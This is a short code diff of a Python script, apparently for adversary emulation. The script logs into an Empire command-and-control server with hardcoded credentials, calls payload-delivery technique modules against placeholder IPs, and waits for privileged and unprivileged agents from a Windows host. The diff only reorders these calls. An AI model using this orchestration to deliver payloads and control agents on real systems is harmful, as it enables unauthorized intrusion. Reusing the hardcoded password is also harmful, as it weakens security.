@@ -12,14 +12,18 @@ try:
     # use a common API context instead of creating new ones within Empire techniques
     API = empireAPI('empirec2', uname='empireadmin', passwd='Password123')
 
-    AGENTNAME = empire_wait_for_agent.run(API,'pec-WIN10PRO64', False)
-    print(AGENTNAME) # blank means no agent found
-
     # every technique script implements a run function
     # technique scripts encapsulate technique specific details
     stage2.deliver_payload.windows.technique1.run("1.1.1.1")
     print(stage2.deliver_payload.windows.technique1.run("2.2.2.2"))
-    
+
+    # wait for privilege agent
+    AGENTNAME = empire_wait_for_agent.run(API,'pec-WIN10PRO64', True)
+    print(AGENTNAME) # blank means no agent found
+
+    # wait for non-privilege agent
+    AGENTNAME = empire_wait_for_agent.run(API,'pec-WIN10PRO64', False)
+    print(AGENTNAME) # blank means no agent found    
     # technique 2 is a folder module vs technique 1 which is a script
     stage2.deliver_payload.windows.technique2.something('a','b')
 except Exception as e:
